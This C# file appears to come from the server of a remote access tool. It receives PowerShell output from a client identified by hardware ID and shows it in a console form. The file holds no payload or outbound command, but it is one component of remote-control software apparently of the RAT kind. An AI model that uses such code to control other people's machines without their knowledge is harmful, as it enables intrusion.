using Server.Forms;
using Server.MessagePack;
using Server.Connection;
using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace Server.Handle_Packet
{
    public class HandlePowershell
    {
        public void GetPowershell(Clients client, MsgPack unpack_msgpack)
        {
            FormPowershell PS = (FormPowershell)Application.OpenForms["ps:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
            if (PS != null)
            {
                if (PS.Client == null)
                {
                    PS.Client = client;
                    PS.timer1.Enabled = true;
                }
                PS.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("Output").AsString);
                PS.richTextBox1.SelectionStart = PS.richTextBox1.TextLength;
                PS.richTextBox1.ScrollToCaret();
            }
        }
    }
}
